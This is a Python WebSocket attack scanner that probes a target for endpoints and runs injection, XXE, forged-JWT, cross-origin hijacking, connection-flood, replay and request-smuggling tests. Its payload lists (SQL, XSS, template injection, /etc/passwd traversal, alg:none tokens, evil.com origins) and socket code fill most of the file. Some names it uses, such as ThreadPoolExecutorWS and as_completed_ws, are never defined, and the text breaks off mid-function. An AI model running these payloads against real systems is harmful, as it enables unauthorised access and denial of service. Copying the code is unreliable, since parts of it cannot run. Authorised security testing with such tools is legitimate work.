#!/usr/bin/env python3
"""
ZYLON FUSION v5.0.0 - WebSocket Security Engine
================================================
Fused from: STEWS (https://github.com/PalindromeLabs/STEWS)
           + WSHawk (https://github.com/summerwind/WSHawk)
           + Custom Zylon Techniques
Capabilities:
  - WebSocket endpoint discovery
  - WebSocket authentication testing
  - Message fuzzing (JSON, XML, plain text)
  - Cross-origin WebSocket hijacking (CORS-WS)
  - WebSocket DoS detection
  - Stateful attack validation
  - Message manipulation and replay
  - JSON/XML message fuzzing
  - Token/session testing via WebSocket
  - WebSocket to HTTP smuggling
Termux Compatible | No Root Required | Python 3.13+
"""

import os
import sys
import json
import time
import socket
import struct
import hashlib
import base64
import threading
import random
from datetime import datetime
from urllib.parse import urlparse, urljoin

import requests
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

from core.var import (
    USER_AGENTS, DEFAULT_TIMEOUT, MAX_THREADS
)

# ============================================================================
# ANSI COLOR CODES (Termux-compatible)
# ============================================================================

RED = '\033[91m'
GREEN = '\033[92m'
YELLOW = '\033[93m'
CYAN = '\033[96m'
MAGENTA = '\033[95m'
BOLD = '\033[1m'
DIM = '\033[2m'
RESET = '\033[0m'

# ============================================================================
# WEBSOCKET ENDPOINT PATHS (STEWS-style)
# ============================================================================

WS_ENDPOINTS = [
    '/ws', '/websocket', '/socket', '/chat', '/stream',
    '/live', '/realtime', '/push', '/notify', '/events',
    '/socket.io/?EIO=4&transport=websocket',
    '/socket.io/?EIO=3&transport=websocket',
    '/graphql', '/graphql/subscriptions', '/graphql/ws',
    '/api/ws', '/api/websocket', '/api/socket', '/api/live',
    '/cable', '/action_cable',
    '/signalr', '/signalr/connect', '/signalr/negotiate',
    '/ws/v1', '/ws/v2', '/ws/v3',
    '/echo', '/wss', '/connect',
    '/sockjs/info', '/sockjs/websocket',
    '/primus', '/engine.io/?EIO=4&transport=websocket',
    '/faye', '/bayeux',
    '/comet', '/magnet',
    '/pubsub', '/pubsub/ws',
    '/feed', '/updates', '/notifications/ws',
    '/ws/chat', '/ws/game', '/ws/trade', '/ws/data',
    '/.well-known/websocket',
    '/_socket', '/_ws',
]

# ============================================================================
# FUZZ PAYLOADS
# ============================================================================

JSON_FUZZ_PAYLOADS = [
    json.dumps({"action": "subscribe", "channel": "*"}),
    json.dumps({"action": "admin", "cmd": "list"}),
    json.dumps({"type": "ping"}),
    json.dumps({"action": "execute", "cmd": "id"}),
    json.dumps({"action": "subscribe", "channel": "admin"}),
    json.dumps({"op": "query", "query": "__all__"}),
    json.dumps({"method": "system", "params": ["id"]}),
    json.dumps({"type": "request", "id": 1, "method": "debug"}),
    json.dumps({"__proto__": {"admin": True}}),
    json.dumps({"constructor": {"prototype": {"isAdmin": True}}}),
    json.dumps({"$where": "1==1"}),
    json.dumps({"$gt": ""}),
    json.dumps({"action": "delete", "id": "*"}),
    json.dumps({"action": "update", "id": "1", "role": "admin"}),
    json.dumps({"action": "create", "type": "user", "role": "admin"}),
    json.dumps({"action": "subscribe", "channel": "../../etc/passwd"}),
    json.dumps({"type": "eval", "code": "process.exit(1)"}),
    json.dumps({"action": "raw", "data": "AAAA"}),
]

STRING_FUZZ_PAYLOADS = [
    "' OR '1'='1",
    '" OR "1"="1',
    '<script>alert(1)</script>',
    '{{7*7}}',
    '${7*7}',
    '${{7*7}}',
    '#{7*7}',
    '%s%s%s%s%s',
    'A' * 1000,
    '\x00',
    '\r\n\r\n',
    'GET / HTTP/1.1\r\nHost: evil.com\r\n\r\n',
    '../../../etc/passwd',
    '{{config}}',
    '{{self.__class__.__mro__}}',
]

XML_FUZZ_PAYLOADS = [
    '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><msg>&xxe;</msg>',
    '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://127.0.0.1:80/">]><msg>&xxe;</msg>',
    '<msg><action>admin</action><cmd>list</cmd></msg>',
    '<msg><data><![CDATA[<script>alert(1)</script>]]></data></msg>',
]

# ============================================================================
# AUTHENTICATION TEST TOKENS
# ============================================================================

AUTH_TEST_TOKENS = [
    "",  # No auth
    "Bearer null",
    "Bearer undefined",
    "Bearer admin",
    "Bearer eyJhbGciOiJub25lIn0.eyJzdWIiOiJhZG1pbiJ9.",  # alg:none
    "Bearer eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJhZG1pbiIsInJvbGUiOiJhZG1pbiJ9.invalid",  # Weak JWT
]

# ============================================================================
# CROSS-ORIGIN TEST ORIGINS
# ============================================================================

CROSS_ORIGIN_ORIGINS = [
    "https://evil.com",
    "https://attacker.com",
    "null",
    "http://localhost",
    "https://localhost",
]


class WebSocketEngine:
    """WebSocket Security Engine - Fused from STEWS + WSHawk + Custom Techniques"""

    def __init__(self, timeout=DEFAULT_TIMEOUT, threads=MAX_THREADS, proxy=None):
        self.timeout = timeout
        self.threads = threads
        self.proxy = proxy
        self.session = requests.Session()
        self.session.verify = False
        self.session.headers.update({
            'User-Agent': USER_AGENTS[0] if USER_AGENTS else 'Mozilla/5.0'
        })
        if proxy:
            self.session.proxies = {'http': proxy, 'https': proxy}
        self.lock = threading.Lock()
        self._ws_client = None

    def _print(self, msg, color=CYAN):
        """Thread-safe colored print"""
        with self.lock:
            print(f"{color}{msg}{RESET}")

    def _get_ws_client(self):
        """Lazily import and return websocket client"""
        if self._ws_client is None:
            try:
                import websocket
                self._ws_client = websocket
            except ImportError:
                self._print("  [!] websocket-client not installed, using raw socket fallback", YELLOW)
                self._ws_client = False
        return self._ws_client

    # ========================================================================
    # WEBSOCKET ENDPOINT DISCOVERY
    # ========================================================================

    def discover_endpoints(self, target):
        """Find WebSocket endpoints on the target

        Probes common WebSocket paths using HTTP upgrade requests
        and attempts direct WebSocket connections.

        Args:
            target: Target URL or domain

        Returns:
            dict with 'vulnerable', 'findings', 'details', 'scan_type'
        """
        self._print(f"\n{BOLD}{CYAN}  WebSocket Endpoint Discovery{RESET}", CYAN)
        self._print(f"  [*] Target: {target}", CYAN)

        url = target if target.startswith('http') else f"https://{target}"
        parsed = urlparse(url)
        host = parsed.netloc
        base = f"{parsed.scheme}://{parsed.netloc}"

        result = {
            "vulnerable": False,
            "findings": [],
            "details": {
                "target": target,
                "endpoints_found": [],
                "endpoints_tested": len(WS_ENDPOINTS),
            },
            "scan_type": "ws_endpoint_discovery",
        }

        discovered = []
        lock = threading.Lock()

        def test_endpoint(path):
            ws_url = f"wss://{host}{path}"
            http_url = f"{base}{path}"
            try:
                # Probe with HTTP upgrade headers
                resp = self.session.get(
                    http_url,
                    timeout=self.timeout,
                    verify=False,
                    allow_redirects=False,
                    headers={
                        'Connection': 'Upgrade',
                        'Upgrade': 'websocket',
                        'Sec-WebSocket-Version': '13',
                        'Sec-WebSocket-Key': base64.b64encode(os.urandom(16)).decode(),
                    }
                )
                is_ws = False
                if resp.status_code == 101:
                    is_ws = True
                elif 'upgrade' in resp.headers.get('connection', '').lower():
                    is_ws = True
                elif resp.status_code in [400, 426] and 'websocket' in resp.text.lower():
                    is_ws = True

                if is_ws:
                    ep_info = {
                        "path": path,
                        "ws_url": ws_url,
                        "status_code": resp.status_code,
                        "upgrade_confirmed": resp.status_code == 101,
                        "connection_header": resp.headers.get('connection', ''),
                        "upgrade_header": resp.headers.get('upgrade', ''),
                    }
                    with lock:
                        discovered.append(ep_info)
                    self._print(f"  [+] Found WebSocket endpoint: {path} (status: {resp.status_code})", GREEN)

            except Exception:
                pass

            # Also try raw socket upgrade
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(self.timeout)
                port = 443 if parsed.scheme == 'https' else 80
                sock.connect((host, port))

                ws_key = base64.b64encode(os.urandom(16)).decode()
                upgrade_req = (
                    f"GET {path} HTTP/1.1\r\n"
                    f"Host: {host}\r\n"
                    f"Upgrade: websocket\r\n"
                    f"Connection: Upgrade\r\n"
                    f"Sec-WebSocket-Key: {ws_key}\r\n"
                    f"Sec-WebSocket-Version: 13\r\n"
                    f"\r\n"
                ).encode()
                sock.sendall(upgrade_req)
                resp_data = sock.recv(4096).decode('utf-8', errors='replace')
                sock.close()

                if '101' in resp_data and 'websocket' in resp_data.lower():
                    ep_info = {
                        "path": path,
                        "ws_url": ws_url,
                        "status_code": 101,
                        "upgrade_confirmed": True,
                        "method": "raw_socket",
                    }
                    with lock:
                        # Avoid duplicate
                        if not any(e.get('path') == path for e in discovered):
                            discovered.append(ep_info)
                    self._print(f"  [+] Found WebSocket (raw socket): {path}", GREEN)
            except Exception:
                pass

        # Threaded discovery
        with ThreadPoolExecutorWS(max_workers=min(self.threads, 10)) as executor:
            futures = [executor.submit(test_endpoint, path) for path in WS_ENDPOINTS]
            for future in as_completed_ws(futures):
                pass

        result["details"]["endpoints_found"] = discovered
        if discovered:
            result["vulnerable"] = True
            result["findings"].append({
                "type": "ws_endpoints_found",
                "severity": "Medium",
                "description": f"Found {len(discovered)} WebSocket endpoint(s). "
                              f"These should be tested for authentication and access control.",
                "endpoints": discovered,
            })
            self._print(f"  [+] Discovered {len(discovered)} WebSocket endpoint(s)", GREEN)
        else:
            self._print(f"  [-] No WebSocket endpoints found", GREEN)

        return result

    # ========================================================================
    # WEBSOCKET AUTHENTICATION TESTING
    # ========================================================================

    def test_auth(self, url):
        """Authentication testing for WebSocket endpoints

        Tests various authentication bypass techniques including
        missing tokens, null tokens, and algorithm confusion.

        Args:
            url: WebSocket URL to test (ws:// or wss://)

        Returns:
            dict with 'vulnerable', 'findings', 'details', 'scan_type'
        """
        self._print(f"\n{BOLD}{CYAN}  WebSocket Auth Testing{RESET}", CYAN)
        self._print(f"  [*] Target: {url}", CYAN)

        # Normalize to ws:// URL
        ws_url = url
        if url.startswith('https://'):
            ws_url = 'wss://' + url[8:]
        elif url.startswith('http://'):
            ws_url = 'ws://' + url[7:]
        elif not url.startswith('ws'):
            ws_url = 'wss://' + url

        result = {
            "vulnerable": False,
            "findings": [],
            "details": {
                "url": ws_url,
                "tests_run": [],
                "auth_bypasses": [],
            },
            "scan_type": "ws_auth_testing",
        }

        ws_lib = self._get_ws_client()

        for i, token in enumerate(AUTH_TEST_TOKENS):
            test_name = f"auth_test_{i}" if token else "no_auth"
            test_detail = {
                "test": test_name,
                "token_used": token[:50] if token else "(none)",
                "connected": False,
            }

            try:
                if ws_lib:
                    # Use websocket-client library
                    header = {}
                    if token:
                        header['Authorization'] = token

                    ws = ws_lib.create_connection(
                        ws_url,
                        timeout=self.timeout,
                        header=header,
                        suppress_origin=True,
                    )
                    test_detail["connected"] = True

                    # Try to send a test message
                    try:
                        ws.send(json.dumps({"type": "ping"}))
                        resp = ws.recv()
                        test_detail["received_response"] = True
                        test_detail["response_preview"] = str(resp)[:200]
                    except Exception:
                        test_detail["received_response"] = False

                    ws.close()
                else:
                    # Fallback: raw socket test
                    parsed = urlparse(ws_url)
                    host = parsed.hostname
                    port = parsed.port or (443 if parsed.scheme == 'wss' else 80)
                    path = parsed.path or '/'

                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(self.timeout)
                    sock.connect((host, port))

                    ws_key = base64.b64encode(os.urandom(16)).decode()
                    auth_header = f"Authorization: {token}\r\n" if token else ""
                    upgrade_req = (
                        f"GET {path} HTTP/1.1\r\n"
                        f"Host: {host}\r\n"
                        f"Upgrade: websocket\r\n"
                        f"Connection: Upgrade\r\n"
                        f"Sec-WebSocket-Key: {ws_key}\r\n"
                        f"Sec-WebSocket-Version: 13\r\n"
                        f"{auth_header}"
                        f"\r\n"
                    ).encode()
                    sock.sendall(upgrade_req)
                    resp_data = sock.recv(4096).decode('utf-8', errors='replace')
                    sock.close()

                    if '101' in resp_data:
                        test_detail["connected"] = True
                        test_detail["method"] = "raw_socket"

            except Exception as e:
                test_detail["error"] = str(e)[:100]

            result["details"]["tests_run"].append(test_detail)

            # Check for auth bypass
            if test_detail.get("connected") and (not token or token in ["", "Bearer null", "Bearer undefined"]):
                result["vulnerable"] = True
                bypass_finding = {
                    "type": "ws_auth_bypass",
                    "severity": "High",
                    "description": f"WebSocket connection accepted with token: '{token[:30]}' - "
                                  f"authentication may be missing or bypassed",
                    "token_used": token[:50] if token else "(none)",
                }
                result["findings"].append(bypass_finding)
                result["details"]["auth_bypasses"].append(bypass_finding)
                self._print(f"  [!!!] AUTH BYPASS: Connected with token '{token[:30]}'", RED)
            elif test_detail.get("connected"):
                self._print(f"  [*] Connected with token: {token[:30]}...", DIM + CYAN)
            else:
                self._print(f"  [-] Connection failed with token: {token[:30]}", DIM)

        if not result["vulnerable"]:
            self._print(f"  [-] No authentication bypass detected", GREEN)

        return result

    # ========================================================================
    # MESSAGE FUZZING
    # ========================================================================

    def fuzz_messages(self, url):
        """Message fuzzing on WebSocket endpoints

        Sends various fuzz payloads (JSON, XML, string) to discover
        injection vulnerabilities, crashes, and unexpected behavior.

        Args:
            url: WebSocket URL to test

        Returns:
            dict with 'vulnerable', 'findings', 'details', 'scan_type'
        """
        self._print(f"\n{BOLD}{CYAN}  WebSocket Message Fuzzing{RESET}", CYAN)
        self._print(f"  [*] Target: {url}", CYAN)

        ws_url = url
        if url.startswith('https://'):
            ws_url = 'wss://' + url[8:]
        elif url.startswith('http://'):
            ws_url = 'ws://' + url[7:]
        elif not url.startswith('ws'):
            ws_url = 'wss://' + url

        result = {
            "vulnerable": False,
            "findings": [],
            "details": {
                "url": ws_url,
                "payloads_sent": 0,
                "interesting_responses": [],
            },
            "scan_type": "ws_message_fuzzing",
        }

        ws_lib = self._get_ws_client()
        connected = False
        ws_conn = None

        try:
            if ws_lib:
                ws_conn = ws_lib.create_connection(ws_url, timeout=self.timeout)
                connected = True
        except Exception as e:
            self._print(f"  [!] Could not connect to WebSocket: {e}", RED)

        if not connected:
            self._print(f"  [-] Skipping fuzzing - no WebSocket connection", YELLOW)
            result["findings"].append({
                "type": "info",
                "description": f"Could not establish WebSocket connection: {str(e)[:100]}",
            })
            return result

        all_payloads = (
            [(p, 'json') for p in JSON_FUZZ_PAYLOADS] +
            [(p, 'string') for p in STRING_FUZZ_PAYLOADS] +
            [(p, 'xml') for p in XML_FUZZ_PAYLOADS]
        )

        payloads_sent = 0
        interesting = []

        for payload, ptype in all_payloads:
            try:
                ws_conn.send(payload)
                payloads_sent += 1

                # Try to receive response with short timeout
                ws_conn.settimeout(2)
                try:
                    resp = ws_conn.recv()
                    # Check for interesting responses
                    resp_str = str(resp)
                    interest_level = self._analyze_response(resp_str, payload, ptype)
                    if interest_level:
                        interesting.append({
                            "payload_type": ptype,
                            "payload": payload[:200],
                            "response": resp_str[:500],
                            "interest": interest_level,
                        })
                        self._print(f"  [!] Interesting response ({interest_level}): {resp_str[:80]}", YELLOW)
                except Exception:
                    pass

                time.sleep(0.05)

            except Exception as e:
                # Connection may have been reset
                self._print(f"  [-] Fuzz payload caused disconnect: {str(e)[:50]}", DIM)
                result["findings"].append({
                    "type": "ws_fuzz_crash",
                    "severity": "Medium",
                    "description": f"Fuzz payload caused WebSocket disconnection - "
                                  f"may indicate crash or input validation issue",
                    "payload_type": ptype,
                    "payload_preview": payload[:100],
                })
                result["vulnerable"] = True

                # Try to reconnect
                try:
                    ws_conn = ws_lib.create_connection(ws_url, timeout=self.timeout)
                except Exception:
                    break

        try:
            ws_conn.close()
        except Exception:
            pass

        result["details"]["payloads_sent"] = payloads_sent
        result["details"]["interesting_responses"] = interesting

        if interesting:
            result["vulnerable"] = True
            for resp_info in interesting:
                result["findings"].append({
                    "type": "ws_interesting_response",
                    "severity": "Medium" if resp_info["interest"] == "potential_injection" else "Low",
                    "description": f"Interesting response during {resp_info['payload_type']} fuzzing: "
                                  f"{resp_info['interest']}",
                    "payload_type": resp_info["payload_type"],
                    "payload_preview": resp_info["payload"][:100],
                    "response_preview": resp_info["response"][:200],
                })

        self._print(f"  [*] Sent {payloads_sent} fuzz payloads, {len(interesting)} interesting responses", CYAN)

        return result

    def _analyze_response(self, response, payload, payload_type):
        """Analyze fuzz response for interesting patterns"""
        resp_lower = response.lower()

        # Error patterns indicating injection
        error_patterns = [
            ('sql_error', ['sql', 'mysql', 'postgresql', 'sqlite', 'odbc', 'oracle']),
            ('js_error', ['referenceerror', 'typeerror', 'syntaxerror', 'rangeerror']),
            ('ssti_reflection', ['49', '77']),  # 7*7=49 or 7*7 template eval
            ('path_traversal', ['root:', '/bin/', '/etc/passwd', 'no such file']),
            ('xxe', ['entity', 'doctype', 'xml parse']),
            ('server_error', ['stack trace', 'traceback', 'internal server error', 'exception']),
            ('debug_info', ['debug', 'verbose', 'logging']),
        ]

        for category, patterns in error_patterns:
            for pattern in patterns:
                if pattern in resp_lower:
                    # Verify it's not just in the payload echo
                    if pattern not in payload.lower():
                        return category

        # Check if template injection payload was evaluated
        if payload_type in ('json', 'string'):
            if '{{7*7}}' in payload and '49' in response:
                return 'ssti_reflection'
            if '${7*7}' in payload and '49' in response:
                return 'ssti_reflection'
            if '${{7*7}}' in payload and '49' in response:
                return 'ssti_reflection'

        return None

    # ========================================================================
    # CROSS-ORIGIN WEBSOCKET HIJACKING
    # ========================================================================

    def test_cross_origin(self, url):
        """Cross-origin WebSocket hijacking test

        Tests if the WebSocket server accepts connections from
        arbitrary origins without proper origin validation.

        Args:
            url: WebSocket URL to test

        Returns:
            dict with 'vulnerable', 'findings', 'details', 'scan_type'
        """
        self._print(f"\n{BOLD}{CYAN}  Cross-Origin WebSocket Hijacking Test{RESET}", CYAN)
        self._print(f"  [*] Target: {url}", CYAN)

        ws_url = url
        if url.startswith('https://'):
            ws_url = 'wss://' + url[8:]
        elif url.startswith('http://'):
            ws_url = 'ws://' + url[7:]
        elif not url.startswith('ws'):
            ws_url = 'wss://' + url

        result = {
            "vulnerable": False,
            "findings": [],
            "details": {
                "url": ws_url,
                "origins_tested": CROSS_ORIGIN_ORIGINS,
                "accepted_origins": [],
            },
            "scan_type": "ws_cross_origin",
        }

        ws_lib = self._get_ws_client()

        for origin in CROSS_ORIGIN_ORIGINS:
            try:
                if ws_lib:
                    ws = ws_lib.create_connection(
                        ws_url,
                        timeout=self.timeout,
                        origin=origin,
                    )
                    # Connection accepted from cross-origin
                    result["details"]["accepted_origins"].append(origin)
                    result["vulnerable"] = True
                    self._print(f"  [!!!] WebSocket accepted connection from origin: {origin}", RED)

                    # Try to send/receive
                    try:
                        ws.send(json.dumps({"type": "ping"}))
                        resp = ws.recv()
                        self._print(f"    Response: {str(resp)[:100]}", YELLOW)
                    except Exception:
                        pass

                    ws.close()
                else:
                    # Raw socket test with Origin header
                    parsed = urlparse(ws_url)
                    host = parsed.hostname
                    port = parsed.port or (443 if parsed.scheme == 'wss' else 80)
                    path = parsed.path or '/'

                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(self.timeout)
                    sock.connect((host, port))

                    ws_key = base64.b64encode(os.urandom(16)).decode()
                    upgrade_req = (
                        f"GET {path} HTTP/1.1\r\n"
                        f"Host: {host}\r\n"
                        f"Upgrade: websocket\r\n"
                        f"Connection: Upgrade\r\n"
                        f"Sec-WebSocket-Key: {ws_key}\r\n"
                        f"Sec-WebSocket-Version: 13\r\n"
                        f"Origin: {origin}\r\n"
                        f"\r\n"
                    ).encode()
                    sock.sendall(upgrade_req)
                    resp_data = sock.recv(4096).decode('utf-8', errors='replace')
                    sock.close()

                    if '101' in resp_data:
                        result["details"]["accepted_origins"].append(origin)
                        result["vulnerable"] = True
                        self._print(f"  [!!!] WebSocket accepted origin: {origin}", RED)

            except Exception as e:
                self._print(f"  [-] Origin {origin} rejected: {str(e)[:50]}", DIM)

        if result["vulnerable"]:
            result["findings"].append({
                "type": "ws_cross_origin_hijacking",
                "severity": "High",
                "description": f"WebSocket accepts connections from {len(result['details']['accepted_origins'])} "
                              f"cross-origin(s): {result['details']['accepted_origins']}. "
                              f"An attacker can establish a WebSocket connection from a malicious page "
                              f"and interact with the WebSocket as the victim user.",
                "accepted_origins": result["details"]["accepted_origins"],
            })
        else:
            self._print(f"  [-] No cross-origin hijacking detected", GREEN)

        return result

    # ========================================================================
    # WEBSOCKET DOS DETECTION
    # ========================================================================

    def test_dos(self, url):
        """WebSocket DoS detection

        Tests for denial of service vulnerabilities including
        large message handling, rapid connection flooding, and
        resource exhaustion patterns.

        Args:
            url: WebSocket URL to test

        Returns:
            dict with 'vulnerable', 'findings', 'details', 'scan_type'
        """
        self._print(f"\n{BOLD}{CYAN}  WebSocket DoS Detection{RESET}", CYAN)
        self._print(f"  [*] Target: {url}", CYAN)

        ws_url = url
        if url.startswith('https://'):
            ws_url = 'wss://' + url[8:]
        elif url.startswith('http://'):
            ws_url = 'ws://' + url[7:]
        elif not url.startswith('ws'):
            ws_url = 'wss://' + url

        result = {
            "vulnerable": False,
            "findings": [],
            "details": {
                "url": ws_url,
                "tests_run": [],
            },
            "scan_type": "ws_dos_detection",
        }

        ws_lib = self._get_ws_client()

        # Test 1: Large message handling
        self._print(f"  [*] Test 1: Large message handling...", CYAN)
        large_msg_result = {"test": "large_message", "max_size_accepted": 0}
        for size in [1024, 10240, 102400, 1048576]:  # 1KB, 10KB, 100KB, 1MB
            try:
                if ws_lib:
                    ws = ws_lib.create_connection(ws_url, timeout=self.timeout)
                    ws.send("A" * size)
                    try:
                        ws.settimeout(3)
                        resp = ws.recv()
                        large_msg_result["max_size_accepted"] = size
                        self._print(f"    [*] Accepted message of {size} bytes", DIM + CYAN)
                    except Exception:
                        pass
                    ws.close()
            except Exception:
                break
        result["details"]["tests_run"].append(large_msg_result)

        if large_msg_result["max_size_accepted"] >= 1048576:
            result["findings"].append({
                "type": "ws_large_message_accepted",
                "severity": "Medium",
                "description": f"WebSocket accepted messages up to 1MB without limits. "
                              f"Server may be vulnerable to memory exhaustion attacks.",
                "max_size_accepted": large_msg_result["max_size_accepted"],
            })
            result["vulnerable"] = True

        # Test 2: Rapid connection flood (limited for safety)
        self._print(f"  [*] Test 2: Rapid connection test...", CYAN)
        connections_made = 0
        max_conns = 20  # Conservative limit for testing
        for i in range(max_conns):
            try:
                if ws_lib:
                    ws = ws_lib.create_connection(ws_url, timeout=5)
                    connections_made += 1
                    # Don't close immediately - hold connection
                else:
                    break
            except Exception:
                break

        flood_result = {"test": "connection_flood", "connections_made": connections_made}
        result["details"]["tests_run"].append(flood_result)

        if connections_made >= max_conns:
            result["findings"].append({
                "type": "ws_no_connection_limit",
                "severity": "Medium",
                "description": f"Server accepted {connections_made} rapid connections without rate limiting. "
                              f"May be vulnerable to connection exhaustion DoS.",
                "connections_made": connections_made,
            })
            result["vulnerable"] = True

        # Test 3: Rapid message sending
        self._print(f"  [*] Test 3: Rapid message sending...", CYAN)
        rapid_msgs = 0
        try:
            if ws_lib:
                ws = ws_lib.create_connection(ws_url, timeout=self.timeout)
                start = time.time()
                for i in range(100):
                    try:
                        ws.send(json.dumps({"type": "test", "seq": i}))
                        rapid_msgs += 1
                    except Exception:
                        break
                elapsed = time.time() - start
                ws.close()

                rate = rapid_msgs / elapsed if elapsed > 0 else 0
                rapid_result = {
                    "test": "rapid_messages",
                    "messages_sent": rapid_msgs,
                    "time_seconds": round(elapsed, 2),
                    "messages_per_second": round(rate, 1),
                }
                result["details"]["tests_run"].append(rapid_result)

                if rate > 500:
                    result["findings"].append({
                        "type": "ws_no_message_rate_limit",
                        "severity": "Low",
                        "description": f"Server accepted {rate:.0f} messages/second without rate limiting.",
                        "rate_per_second": round(rate, 1),
                    })
        except Exception:
            pass

        if not result["vulnerable"]:
            self._print(f"  [-] No significant DoS vulnerabilities detected", GREEN)

        return result

    # ========================================================================
    # MESSAGE REPLAY ATTACKS
    # ========================================================================

    def test_message_replay(self, url):
        """Message replay attack testing

        Captures and replays WebSocket messages to test if the
        server properly validates message freshness and state.

        Args:
            url: WebSocket URL to test

        Returns:
            dict with 'vulnerable', 'findings', 'details', 'scan_type'
        """
        self._print(f"\n{BOLD}{CYAN}  WebSocket Message Replay Testing{RESET}", CYAN)
        self._print(f"  [*] Target: {url}", CYAN)

        ws_url = url
        if url.startswith('https://'):
            ws_url = 'wss://' + url[8:]
        elif url.startswith('http://'):
            ws_url = 'ws://' + url[7:]
        elif not url.startswith('ws'):
            ws_url = 'wss://' + url

        result = {
            "vulnerable": False,
            "findings": [],
            "details": {
                "url": ws_url,
                "messages_replayed": 0,
                "replay_accepted": [],
            },
            "scan_type": "ws_message_replay",
        }

        ws_lib = self._get_ws_client()
        if not ws_lib:
            result["findings"].append({
                "type": "info",
                "description": "websocket-client not available for replay testing",
            })
            return result

        test_messages = [
            json.dumps({"type": "ping", "timestamp": int(time.time())}),
            json.dumps({"action": "subscribe", "channel": "test"}),
            json.dumps({"action": "create", "data": "replay_test_1"}),
            json.dumps({"action": "update", "id": 1, "value": "replay_test"}),
        ]

        replay_accepted = 0

        for msg in test_messages:
            try:
                # First send - capture response
                ws1 = ws_lib.create_connection(ws_url, timeout=self.timeout)
                ws1.send(msg)
                ws1.settimeout(3)
                try:
                    resp1 = ws1.recv()
                except Exception:
                    resp1 = None
                ws1.close()

                # Second send (replay) - check if accepted
                time.sleep(0.5)
                ws2 = ws_lib.create_connection(ws_url, timeout=self.timeout)
                ws2.send(msg)  # Exact same message
                ws2.settimeout(3)
                try:
                    resp2 = ws2.recv()
                except Exception:
                    resp2 = None
                ws2.close()

                result["details"]["messages_replayed"] += 1

                # If same message is accepted again, server doesn't validate freshness
                if resp2 is not None:
                    replay_accepted += 1
                    result["details"]["replay_accepted"].append({
                        "message": msg[:100],
                        "response": str(resp2)[:200],
                    })
                    self._print(f"  [!] Replay accepted: {msg[:60]}", YELLOW)

            except Exception as e:
                self._print(f"  [-] Replay test failed for message: {str(e)[:50]}", DIM)

        if replay_accepted > 0:
            result["vulnerable"] = True
            result["findings"].append({
                "type": "ws_message_replay",
                "severity": "Medium",
                "description": f"Server accepted {replay_accepted} replayed message(s) without "
                              f"freshness validation. An attacker could replay captured messages "
                              f"to perform unauthorized actions.",
                "replay_accepted_count": replay_accepted,
                "messages_tested": len(test_messages),
            })
        else:
            self._print(f"  [-] No message replay vulnerability detected", GREEN)

        return result

    # ========================================================================
    # WEBSOCKET TO HTTP SMUGGLING
    # ========================================================================

    def _test_ws_http_smuggling(self, url):
        """Test WebSocket to HTTP smuggling (internal method)"""
        self._print(f"  [*] Testing WS-to-HTTP smuggling...", CYAN)

        ws_url = url
        if url.startswith('https://'):
            ws_url = 'wss://' + url[8:]
        elif url.startswith('http://'):
            ws_url = 'ws://' + url[7:]

        parsed = urlparse(ws_url)
        host = parsed.hostname
        port = parsed.port or (443 if parsed.scheme == 'wss' else 80)
        path = parsed.path or '/'

        findings = []

        # Test: Send HTTP request over WebSocket connection
        try:
            ws_lib = self._get_ws_client()
            if ws_lib:
                ws = ws_lib.create_connection(ws_url, timeout=self.timeout)
                # Try to smuggle an HTTP request
                smuggle_payload = "GET /admin HTTP/1.1\r\nHost: " + host + "\r\n\r\n"
                ws.send(smuggle_payload)
                ws.settimeout(3)
                try:
                    resp = ws.recv()
                    if 'HTTP/1.' in str(resp) or 'admin' in str(resp).lower():
                        findings.append({
                            "type": "ws_http_smuggling",
                            "severity": "High",
                            "description": "Potential WebSocket-to-HTTP smuggling: server processed "
                                          "HTTP request sent over WebSocket connection",
                            "response_preview": str(resp)[:200],
                        })
                except Exception:
                    pass
                ws.close()
        except Exception:
            pass

        # Test: Upgrade header manipulation
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(self.timeout)
            sock.connect((host, port))

            ws_key = base64.b64encode(os.urandom(16)).decode()
            # Malformed upgrade request
            upgrade_req = (
                f"GET {path} HTTP/1.1\r\n"
                f"Host: {host}\r\n"
                f"Upgrade: websocket\r\n"
                f"Connection: keep-alive, Upgrade\r\n"
                f"Sec-WebSocket-Key: {ws_key}\r\n"
                f"Sec-WebSocket-Version: 13\r\n"
                f"Content-Length: 0\r\n"
                f"\r\n"
                f"GET /smuggled HTTP/1.1\r\n"
                f"Host: {host}\r\n"
                f"\r\n"
            ).encode()
            sock.sendall(upgrade_req)
            resp_data = sock.recv(4096).decode('utf-8', errors='replace')
            sock.close()

            if 'smuggled' in resp_data.lower() or resp_data.count('HTTP/1.') > 1:
                findings.append({
                    "type": "ws_smuggle_via_upgrade",
                    "severity": "High",
                    "description": "Potential request smuggling via WebSocket upgrade headers",
                    "response_preview": resp_data[:200],
                })
        except Exception:
            pass

        return findings

    # ========================================================================
    # MAIN ENTRY POINT
    # ========================================================================

    def run(self, target, scan_type='full', **kwargs):
        """Main entry point for WebSocket Security Engine

        Args:
            target: Target URL or domain
            scan_type: Type of scan to run
                - 'discovery': Endpoint discovery only
                - 'auth': Authentication testing
                - 'fuzz': Message fuzzing
                - 'cross_origin': Cross-origin hijacking
                - 'dos': DoS detection
                - 'replay': Message replay testing
                - 'full': Run all tests
        Returns:
            dict with 'vulnerable', 'findings', 'details', 'scan_type'
        """
        self._print(f"\n{BOLD}{CYAN}═══════════════════════════════════════════════════{RESET}", CYAN)
        self._print(f"{BOLD}{CYAN}  WEBSOCKET SECURITY ENGINE - v5.0.0{RESET}", CYAN)
        self._print(f"{BOLD}{CYAN}  Fused from: STEWS + WSHawk + Custom Techniques{RESET}", CYAN)
        self._print(f"{BOLD}{CYAN}═══════════════════════════════════════════════════{RESET}", CYAN)

        url = target if target.startswith('http') else f"https://{target}"

        scan_map = {
            'discovery': lambda: self.discover_endpoints(url),
            'auth': lambda: self.test_auth(url),
            'fuzz': lambda: self.fuzz_messages(url),
            'cross_origin': lambda: self.test_cross_origin(url),
            'dos': lambda: self.test_dos(url),
            'replay': lambda: self.test_message_replay(url),
        }

        if scan_type == 'full':
            all_findings = []
